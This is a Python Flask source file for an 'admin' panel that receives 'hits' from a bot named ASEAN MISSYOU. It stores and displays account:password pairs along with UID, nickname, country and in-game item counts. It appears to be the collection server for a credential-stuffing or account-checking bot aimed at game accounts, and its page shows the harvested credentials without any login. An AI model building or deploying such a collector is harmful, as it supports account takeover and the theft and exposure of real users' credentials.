#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Web Admin nhận hit từ bot ASEAN MISSYOU
Chạy được trên Render (Python)
"""

import json
import os
from datetime import datetime
from pathlib import Path
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)
DATA_FILE = Path("hits.json")
DATA_FILE.touch(exist_ok=True)

HTML = """
<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>ASEAN MISSYOU - Admin</title>
<style>
  :root { --bg:#0f1117; --card:#1a1d27; --border:#2a2e3a; --text:#e8eaed; --muted:#9aa0a6; --accent:#7c9cff; }
  * { box-sizing:border-box; }
  body { margin:0; font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif; background:var(--bg); color:var(--text); }
  header { padding:20px 24px; border-bottom:1px solid var(--border); display:flex; justify-content:space-between; align-items:center; }
  header h1 { margin:0; font-size:20px; font-weight:600; }
  header .count { color:var(--muted); font-size:14px; }
  .container { max-width:1100px; margin:0 auto; padding:20px; }
  .card { background:var(--card); border:1px solid var(--border); border-radius:12px; padding:16px 18px; margin-bottom:14px; }
  .card-head { display:flex; justify-content:space-between; align-items:center; margin-bottom:10px; }
  .acc { font-family:ui-monospace,SFMono-Regular,Menlo,monospace; font-size:15px; color:#a8c7ff; }
  .time { color:var(--muted); font-size:12px; }
  .meta { display:flex; flex-wrap:wrap; gap:12px 18px; font-size:13px; color:var(--muted); margin-bottom:10px; }
  .meta b { color:var(--text); font-weight:500; }
  pre { margin:0; white-space:pre-wrap; word-break:break-word; font-size:13px; line-height:1.5; background:#12141c; padding:12px; border-radius:8px; border:1px solid var(--border); }
  .empty { text-align:center; color:var(--muted); padding:60px 0; }
  .badge { display:inline-block; padding:2px 8px; border-radius:999px; font-size:11px; background:#2a3142; color:#c5d0ff; }
</style>
</head>
<body>
<header>
  <h1>ASEAN MISSYOU</h1>
  <div class="count">{{ hits|length }} hits</div>
</header>
<div class="container">
{% if not hits %}
  <div class="empty">Chưa có dữ liệu nào.</div>
{% else %}
  {% for h in hits %}
  <div class="card">
    <div class="card-head">
      <div class="acc">{{ h.account }}:{{ h.password }}</div>
      <div class="time">{{ h.time }}</div>
    </div>
    <div class="meta">
      <span>UID: <b>{{ h.uid or '-' }}</b></span>
      <span>Nick: <b>{{ h.nickname or '-' }}</b></span>
      <span>Country: <b>{{ h.country or '-' }}</b></span>
      <span>Shells: <b>{{ h.shells or 0 }}</b></span>
      <span>Skins: <b>{{ h.total_skins or 0 }}</b></span>
      <span class="badge">{{ h.backend or '' }}</span>
    </div>
    {% if h.full_text %}
    <pre>{{ h.full_text }}</pre>
    {% endif %}
  </div>
  {% endfor %}
{% endif %}
</div>
</body>
</html>
"""


def load_hits():
    try:
        return json.loads(DATA_FILE.read_text(encoding="utf-8"))
    except Exception:
        return []


def save_hits(hits):
    DATA_FILE.write_text(
        json.dumps(hits[:500], ensure_ascii=False, indent=2),
        encoding="utf-8",
    )


@app.route("/", methods=["GET"])
def index():
    hits = load_hits()
    return render_template_string(HTML, hits=hits)


@app.route("/hit", methods=["POST"])
def receive_hit():
    data = request.get_json(force=True, silent=True) or {}
    if not data.get("account"):
        return jsonify({"ok": False}), 400

    hits = load_hits()
    hits.insert(0, data)
    save_hits(hits)
    return jsonify({"ok": True})


if __name__ == "__main__":
    port = int(os.getenv("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
